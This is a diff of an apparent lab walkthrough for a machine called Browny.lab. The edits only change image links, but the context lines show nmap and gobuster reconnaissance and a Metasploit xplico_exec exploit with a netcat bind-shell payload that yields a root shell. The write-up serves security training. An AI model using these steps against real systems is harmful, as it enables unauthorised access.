@@ -41,7 +41,7 @@ nmap -sV -sC -sT Browny.lab
 
 
 
-![nmap.PNG](/posts/images/nmap.PNG)
+![nmap.PNG](https://ahmedameenaim.github.io/username.github.io/posts/images/nmap.PNG)
 
 
 <h3>we notice that there three  ports are open.</h3>
@@ -52,11 +52,11 @@ so we can to  do http enumeration for finding any clues that lead us to access t
 
 it just a dummy html page. and nothing more.
 
-<img src = "/posts/images/dummy.png">
+<img src = "https://ahmedameenaim.github.io/username.github.io/posts/images/dummy.png">
 
 <h3>#Brupsuite</h3>
 Via Brupsuite lets check The Get Request to server and Response Maybe we found something useful.
-<img src = "/posts/images/dummy2.PNG">
+<img src = "https://ahmedameenaim.github.io/username.github.io/posts/images/dummy2.PNG">
 Not Much except the explico that will be a great indicator for gaining access for this machine.
 
 always while you doing http enumeration try to brute force subdirectries for finding any intersesting web pages could give you a greate information about your target
@@ -67,7 +67,7 @@ Gobuster is such a greate tool for brute forcing hidden directories in web appli
 gobuster -u 'http://Browny.lab' -w /usr/share/wordlists/dirb/common.txt
 </pre>
 
-<img src = "/posts/images/dummy3.PNG">
+<img src = "https://ahmedameenaim.github.io/username.github.io/posts/images/dummy3.PNG">
 based on the response code we got they have 403 which mean we don't have premission to access to those webpages.
 
 
@@ -87,7 +87,7 @@ By doing search we will find exploit with rank excellent
 grep http search xplico
 use exploit/linux/http/xplico_exec
 </pre>
-![meta1.PNG](/posts/images/meta1.PNG)
+![meta1.PNG](https://ahmedameenaim.github.io/username.github.io/posts/images/meta1.PNG)
 <pre>
 show options
 set LHOST 10.253.x.x
@@ -96,7 +96,7 @@ show payloads
 set  PAYLOAD cmd/unix/bind_netcat
 </pre>
 
-![meta2.PNG](/posts/images/meta2.png)
+![meta2.PNG](https://ahmedameenaim.github.io/username.github.io/posts/images/meta2.png)
 
 and now we have a shell.let do id command line to know make sure about privilege as root
 we play an easy machine so don't need to privilege escalation or any complicated stuffs. all we need to do
